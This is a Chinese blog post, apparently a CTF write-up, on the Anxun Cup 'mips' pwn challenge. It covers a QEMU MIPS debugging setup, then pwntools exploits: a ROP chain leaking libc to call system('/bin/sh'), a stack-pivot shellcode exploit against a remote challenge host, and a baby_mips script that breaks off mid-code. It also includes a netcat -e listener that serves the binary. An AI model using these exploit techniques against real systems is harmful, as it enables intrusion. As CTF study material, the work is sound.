<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Q1IQ"><title>安洵杯 MIPS · Q1IQ</title><meta name="description" content="题目名字就叫做mips，肯定是mips架构的了。
12$ file pwn2 pwn2: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, not s"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Q1IQ</a></h3><div class="description"><p>北京邮电大学 网络空间安全专业</p></div></div></div><ul class="social-links"></ul><script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="footer"><a target="_blank" href="/"><span id="busuanzi_container_site_pv"></span><i class="fa fa-eye"></i>访问量<span id="busuanzi_value_site_pv"></span>次 |  <span id="busuanzi_container_site_uv"></span><i class="fa fa-user-md"></i>访客数<span id="busuanzi_value_site_uv"></span>人</a></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">Home</a></li><li><a href="/archives">Arquivo</a></li><li><a href="/links">Links</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>安洵杯 MIPS</a></h3></div><div class="post-content"><p>题目名字就叫做mips，肯定是mips架构的了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file pwn2 </span><br><span class="line">pwn2: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, not stripped</span><br></pre></td></tr></table></figure>

<p>直接运行程序会显示下面的信息。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200126204738.png" alt=""></p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200126204711.png" alt=""></p>
<p>搭建环境的目标是：1.能运行题目程序 2.能用python脚本和题目程序进行交互 3.能够调试题目程序</p>
<h3 id="所以要搭环境"><a href="#所以要搭环境" class="headerlink" title="所以要搭环境"></a>所以要搭环境</h3><h5 id="mips"><a href="#mips" class="headerlink" title="mips"></a>mips</h5><p>mip汇编知识<a href="https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow#mips-汇编基础" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow#mips-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80</a></p>
<p>关于mips的历史<a href="https://www.cnblogs.com/lcchuguo/p/5118340.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcchuguo/p/5118340.html</a></p>
<h5 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h5><p>QEMU 支持两种操作模式：用户模式仿真和系统模式仿真。<em>用户模式仿真</em> 允许一个 CPU 构建的进程在另一个 CPU 上执行（执行主机 CPU 指令的动态翻译并相应地转换 Linux 系统调用）。<em>系统模式仿真</em> 允许对整个系统进行仿真，包括处理器和配套的外围设备。</p>
<h5 id="老是记不住哪个是大小端"><a href="#老是记不住哪个是大小端" class="headerlink" title="老是记不住哪个是大小端"></a>老是记不住哪个是大小端</h5><p>MSB：大端   -EB（大端）</p>
<p>LSB：小端   -EL （小端）</p>
<h3 id="参考blog"><a href="#参考blog" class="headerlink" title="参考blog"></a>参考blog</h3><p>总体上都是参照着这个博客搭的。</p>
<p><a href="https://e3pem.github.io/2019/08/23/mips-pwn/mips-pwn环境搭建/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/23/mips-pwn/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a></p>
<p>上面博客里给的题我没有成功调出来，找到了下面这个链接里有一个相同的题。</p>
<p><a href="https://github.com/shift-crops/CTFWriteups/blob/68c91eda75d93249d56522e131f963c8135248de/2019/0CTF/Finals/EmbeddedHeap/embedded_heap.tar.gz" target="_blank" rel="noopener">https://github.com/shift-crops/CTFWriteups/blob/68c91eda75d93249d56522e131f963c8135248de/2019/0CTF/Finals/EmbeddedHeap/embedded_heap.tar.gz</a></p>
<h3 id="系统模式"><a href="#系统模式" class="headerlink" title="系统模式"></a>系统模式</h3><h4 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h4><p>为了和模拟出来的整个系统进行通信，需要先配置qemu的网络。配置网络在网上找到两种方法，另外一种修改<code>/etc/network/interfaces</code>的方法不容易成功，还是推荐下面的方法：</p>
<p>创建网桥：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr virbr0</span><br><span class="line">sudo ifconfig virbr0 192.168.122.1/24 up</span><br></pre></td></tr></table></figure>

<p>创建<code>tap</code>接口，名字为<code>tap0</code>，并添加到网桥:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.122.11/24 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br></pre></td></tr></table></figure>

<p>下载并启动qemu镜像，配置qemu虚拟机中的网络。在<a href="https://people.debian.org/~aurel32/qemu/mips/" target="_blank" rel="noopener">这里</a>下载qemu的mips镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用qemu启动下载的镜像</span><br><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>

<p>创建出来的格式是<strong>ELF 32-bit MSB executable, MIPS, MIPS-II version 1 (SYSV)</strong></p>
<p>输入root/root进入虚拟机，设置ip：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.122.12/24 up</span><br></pre></td></tr></table></figure>

<hr>
<p>通过qemu的系统模式模拟出来了整个系统，我们可以在系统里面运行mips架构的程序，那么该如何对其进行调试呢？</p>
<p>可以在<a href="https://github.com/e3pem/embedded-toolkit" target="_blank" rel="noopener">这里下载</a>（原始的项目访问不了了，贴的是自己fork的）各个架构静态编译的gdbserver，使用gdbserver启动要调试的程序或附加到需要调试的进程上。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 启动要调试的程序</span><br><span class="line">root@debian-mips:~# ./gdbserver 0.0.0.0:12345 embedded_heap </span><br><span class="line">Process embedded_heap created; pid = 2379</span><br><span class="line">Listening on port 12345</span><br><span class="line"></span><br><span class="line"># 附加到要调试的进程</span><br><span class="line">root@debian-mips:~# ./gdbserver 0.0.0.0:12345 --attach $(pidof embedded_heap)</span><br><span class="line">Attached; pid = 2790</span><br><span class="line">Listening on port 12345</span><br></pre></td></tr></table></figure>

<p>接着就可以在qemu外使用gdb-mutiarch来连接该端口进行调试了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch embedded_heap</span><br><span class="line">set arch mips</span><br><span class="line">set endian big</span><br><span class="line">target remote 192.168.122.12:12345</span><br></pre></td></tr></table></figure>

<p>教程里写可以使用socat转发数据输入不可见字符。socat从这里获取：<a href="https://github.com/darkerego/mips-binaries" target="_blank" rel="noopener">mips-binaries-master</a>，一个静态编译的mips工具集。然而这个是MSB的，本题用不了。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127212250.png" alt=""></p>
<h4 id="针对本题"><a href="#针对本题" class="headerlink" title="针对本题"></a>针对本题</h4><p>这道题需要下载el（little endian）镜像，下载链接<a href="https://people.debian.org/~aurel32/qemu/mipsel/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/mipsel/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#启动下载的镜像</span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>

<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127183949.png" alt=""></p>
<p>用户名和密码都是root。</p>
<h5 id="运行题目程序"><a href="#运行题目程序" class="headerlink" title="运行题目程序"></a>运行题目程序</h5><p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127183906.png" alt=""></p>
<h5 id="和python交互"><a href="#和python交互" class="headerlink" title="和python交互"></a>和python交互</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while true ;do  nc -lvvp 8080 -t -e ~/pwn2; done;</span><br></pre></td></tr></table></figure>

<h5 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h5><p>找到对应的gdbserver。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127193732.png" alt=""></p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/image-20200127210219321.png" alt=""></p>
<p>使用gdb连接调试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch pwn2</span><br><span class="line">set arch mips</span><br><span class="line">set endian little</span><br><span class="line">target remote ip:12345</span><br></pre></td></tr></table></figure>

<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127210930.png" style="zoom: 25%;" /><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127211049.png" style="zoom: 33%;" /></p>
<h5 id="qemu虚拟机上外网"><a href="#qemu虚拟机上外网" class="headerlink" title="qemu虚拟机上外网"></a>qemu虚拟机上外网</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr virbr0# 添加一座名为 virbr0 的网桥</span><br><span class="line">sudo ifconfig virbr0 192.168.122.1/24 up</span><br><span class="line">sudo tunctl -t tap0  # 创建一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 192.168.122.11/24 up </span><br><span class="line">sudo brctl addif virbr0 tap0  # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">#上面是配置qemu虚拟机和主机通信 如果前面配置过了这里就不用重复配置了</span><br><span class="line">#安装工具</span><br><span class="line">apt-get install bridge-utils        # 虚拟网桥工具</span><br><span class="line">apt-get install uml-utilities       # UML（User-mode linux）工具</span><br><span class="line">#配置ens33和tap0为虚拟网桥virbr0的两个接口</span><br><span class="line">sudo ifconfig ens33 down #ens33是网卡名称(能上网的那张) 关闭宿主机网卡接口</span><br><span class="line">sudo brctl addif virbr0 ens33 # 在 virbr0 中添加ens33作为接口</span><br><span class="line">sudo brctl stp virbr0 off  			# 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd virbr0 1 			#转发延迟</span><br><span class="line">sudo brctl sethello virbr0 1 						#hello 时间</span><br><span class="line">sudo ifconfig virbr0 0.0.0.0 promisc up  #启用 virbr0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up# 启用网卡接口</span><br><span class="line">sudo dhclient virbr0									# 从 dhcp 服务器获得 virbr0 的 IP 地址</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up  # 启用 tap0 接口</span><br><span class="line">#</span><br><span class="line">brctl show virbr0                      # 查看虚拟网桥列表</span><br><span class="line">brctl showstp virbr0                   # 查看 virbr0 的各接口信息</span><br></pre></td></tr></table></figure>

<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200128164453.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#启动下载的镜像</span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure>

<p>-net nic 表示希望 QEMU 在虚拟机中创建一张虚拟网卡，-net tap 表示连接类型为 TAP，并且指定了网卡接口名称(就是刚才创建的 tap0，相当于把虚拟机接入网桥)。</p>
<p>参考博客：<a href="https://wzt.ac.cn/2019/09/10/QEMU-networking/" target="_blank" rel="noopener">https://wzt.ac.cn/2019/09/10/QEMU-networking/</a></p>
<h3 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h3><h5 id="运行题目程序-1"><a href="#运行题目程序-1" class="headerlink" title="运行题目程序"></a>运行题目程序</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./pwn2</span><br><span class="line">qemu-mipsel -L . ./pwn2</span><br><span class="line">./qemu-mipsel-static -L . ./pwn2</span><br></pre></td></tr></table></figure>

<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127181930.png" alt=""></p>
<h5 id="和python交互-1"><a href="#和python交互-1" class="headerlink" title="和python交互"></a>和python交互</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:9999,fork exec:&quot;sudo chroot . ./qemu-mipsel-static ./pwn2&quot;</span><br></pre></td></tr></table></figure>

<h5 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -g 12345 ./pwn2</span><br><span class="line">qemu-mipsel -L . -g 12345 ./pwn2</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch pwn2</span><br><span class="line">set arch mips</span><br><span class="line">set endian little</span><br><span class="line">target remote ip:12345</span><br></pre></td></tr></table></figure>

<p>![image-20200517013946771](/Users/apple/Library/Application Support/typora-user-images/image-20200517013946771.png)</p>
<h3 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h3><h4 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h4><p><a href="https://blog.csdn.net/ajianyingxiaoqinghan/article/details/70917569" target="_blank" rel="noopener">https://blog.csdn.net/ajianyingxiaoqinghan/article/details/70917569</a></p>
<h4 id="现成的工具"><a href="#现成的工具" class="headerlink" title="现成的工具"></a>现成的工具</h4><p><a href="https://www.uclibc.org/downloads/binaries/0.9.30.1/" target="_blank" rel="noopener">https://www.uclibc.org/downloads/binaries/0.9.30.1/</a></p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127175408.png" alt=""></p>
<h4 id="自己下载编译"><a href="#自己下载编译" class="headerlink" title="自己下载编译"></a>自己下载编译</h4><p>以下内容来自于博客<a href="https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow#配置mips虚拟机" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow#%E9%85%8D%E7%BD%AEmips%E8%99%9A%E6%8B%9F%E6%9C%BA</a></p>
<ol>
<li><p>下载buildroot</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2</span></span><br><span class="line">tar -jxvf buildroot-snapshot.tar.bz2</span><br><span class="line">cd buildroot</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置buildroot</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libncurses-dev patch</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>在出现界面后，选择第一项“Target Architecture”，改成MIPS（little endian），另外，选择“Toolchain”，务必将“Kernel Headers”的Linux版本改成你自己主机的Linux版本（因为我们编译出的MIPS交叉工具是需要在我们的主机上运行的）</p>
<p>像我做的这样：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200126205631.png" alt=""></p>
</li>
<li><p>安装</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install texinfo</span><br><span class="line">sudo apt-get install bison</span><br><span class="line">sudo apt-get install flex</span><br><span class="line">sudo make</span><br></pre></td></tr></table></figure>

<p>经过约一小时，编译完成后，在buildroot文件夹下多了一个output文件夹，其中就是编译好的文件，可以在buildroot/output/host/usr/bin找到生成的交叉编译工具，编译器是该目录下的mips-linux-gcc文件。</p>
</li>
<li><p>配置环境变量，使得可以直接使用命令编译文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.bashrc</span><br><span class="line"><span class="keyword">export</span> PATH=$PATH:/Your_Path/buildroot/output/host/usr/bin</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="终于开始做题了"><a href="#终于开始做题了" class="headerlink" title="终于开始做题了"></a>终于开始做题了</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>什么保护都没开。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127215121.png" alt=""></p>
<p>首先看main函数，问你名字是啥，你的名字大小为0x14个字节。虽然这个代码看起来很奇怪吧，但是这个fd=0表示标准输入什么的都是相通的。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127213519.png" alt=""></p>
<p>问完就进到了这个vuln函数里，有个栈溢出在这里。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200127214349.png" alt=""></p>
<h4 id="ROP利用"><a href="#ROP利用" class="headerlink" title="ROP利用"></a>ROP利用</h4><p>应该可以弄一个shellcode。如果是普通的题，可以jmp esp，但我没找着。网上唯一的解是ROP，所以我也跟着那个试了试ROP。思路是先泄露read，再构造<code>system(&#39;/bin/sh&#39;)</code>，<code>&#39;/bin/sh&#39;</code>是在libc里找的，这里就和基础的pwn一毛一样了。自己写的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">"./lib/libc.so.0"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">io = remote(<span class="string">"192.168.3.26"</span>, <span class="number">8080</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(str(data)) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :io.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"What's your name: \n"</span>)</span><br><span class="line">sl(<span class="string">"fuyeqi"</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">r()</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak got</span></span><br><span class="line">j2s2_s1a0=<span class="number">0x004007A8</span><span class="comment">#gadget</span></span><br><span class="line">j_s3210=<span class="number">0x004006C8</span></span><br><span class="line">main=<span class="number">0x00400820</span></span><br><span class="line">c=<span class="string">''</span></span><br><span class="line">c+=<span class="string">'\x31'</span>*<span class="number">0x24</span></span><br><span class="line">c+=p32(j_s3210)</span><br><span class="line">c+=<span class="string">'\x31'</span>*<span class="number">0x1c</span></span><br><span class="line">c+=p32(<span class="number">1111</span>)<span class="comment">#s0</span></span><br><span class="line">c+=p32(elf.got[<span class="string">'read'</span>])<span class="comment">#s1</span></span><br><span class="line">c+=p32(<span class="number">0x0040092C</span>)<span class="comment">#s2</span></span><br><span class="line">c+=p32(<span class="number">1111</span>)<span class="comment">#s3</span></span><br><span class="line">c+=p32(j2s2_s1a0)<span class="comment">#ra  printf(elf.got['read'])</span></span><br><span class="line">c+=<span class="string">'\x20'</span>*<span class="number">0x20</span>				</span><br><span class="line">c+=p32(<span class="number">0x400750</span>) <span class="comment">#执行到 0x00400800 lw $gp, 0x40+var_30($fp)时，$fp+0x10需要可读</span></span><br><span class="line">sl(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libcbase</span></span><br><span class="line">read_addr=u32(r()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc.address=read_addr-libc.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">c=<span class="string">''</span></span><br><span class="line">c+=<span class="string">'\x31'</span>*<span class="number">0x24</span></span><br><span class="line">c+=p32(j_s3210)</span><br><span class="line">c+=<span class="string">'\x31'</span>*<span class="number">0x1c</span></span><br><span class="line">c+=p32(<span class="number">1111</span>)<span class="comment">#s0</span></span><br><span class="line">c+=p32(libc.search(<span class="string">'/bin/sh'</span>).next())<span class="comment">#s1</span></span><br><span class="line">c+=p32(libc.symbols[<span class="string">'system'</span>])<span class="comment">#s2</span></span><br><span class="line">c+=p32(<span class="number">1111</span>)<span class="comment">#s3</span></span><br><span class="line">c+=p32(j2s2_s1a0)<span class="comment">#ra</span></span><br><span class="line">sl(c)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>成功获取shell。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200129114904.png" alt=""></p>
<h4 id="ROP-shellcode"><a href="#ROP-shellcode" class="headerlink" title="ROP+shellcode"></a>ROP+shellcode</h4><p><a href="https://blog.csdn.net/seaaseesa/article/details/105281585" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105281585</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line">#由于不知道uclibc版本，所以，我们利用栈迁移，在bss段布下shellcode执行即可</span><br><span class="line"> </span><br><span class="line">#sh = process(argv=[&apos;qemu-mipsel&apos;,&apos;-g&apos;,&apos;6666&apos;,&apos;-L&apos;,&apos;/home/sea/mips_os/mipsel-linux-uclibc&apos;,&apos;./mips_pwn2&apos;])</span><br><span class="line">#sh = process(argv=[&apos;qemu-mipsel&apos;,&apos;-L&apos;,&apos;/home/sea/mips_os/mipsel-linux-uclibc&apos;,&apos;./mips_pwn2&apos;])</span><br><span class="line">sh = remote(&apos;node3.buuoj.cn&apos;,27820)</span><br><span class="line"> </span><br><span class="line">bss = 0x410B70</span><br><span class="line">text_read = 0x4007E0</span><br><span class="line">sh.sendafter(&quot;What&apos;s your name:&quot;,&quot;haivk&quot;)</span><br><span class="line"> </span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=&apos;mips&apos;)</span><br><span class="line">#ret2shellcode</span><br><span class="line">payload = &apos;a&apos;*0x20</span><br><span class="line">#fp</span><br><span class="line">payload += p32(bss + 0x200 - 0x40 + 0x28)</span><br><span class="line">#调用read向bss段输入shellcode，然后ret到bss段</span><br><span class="line">payload += p32(text_read)</span><br><span class="line"> </span><br><span class="line">sh.send(payload)</span><br><span class="line"> </span><br><span class="line">sleep(1)</span><br><span class="line">payload = &apos;a&apos;*0x24</span><br><span class="line">#ra</span><br><span class="line">payload += p32(bss + 0x200 + 0x28)</span><br><span class="line">payload += shellcode</span><br><span class="line">sh.send(payload)</span><br><span class="line"> </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="栈迁移-ISCC-baby-mips"><a href="#栈迁移-ISCC-baby-mips" class="headerlink" title="栈迁移 ISCC baby_mips"></a>栈迁移 ISCC baby_mips</h4><p>溢出只能覆盖到$fp（相当于ebp）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import pack,unpack,calcsize</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#libc=ELF(&quot;./libc.so.0&quot;)</span><br><span class="line">elf = ELF(&apos;./baby_mips&apos;)</span><br><span class="line">backdoor = 0x00400690</span><br><span class="line">bss_name = 0x004923B0</span><br><span class="line">io = remote(&quot;101.200.240.241&quot;,7030)</span><br><span class="line">s       = lambda data               :io.send(str(data)) </span><br><span class="line">sa      = lambda delim,data         :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data               :io.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data         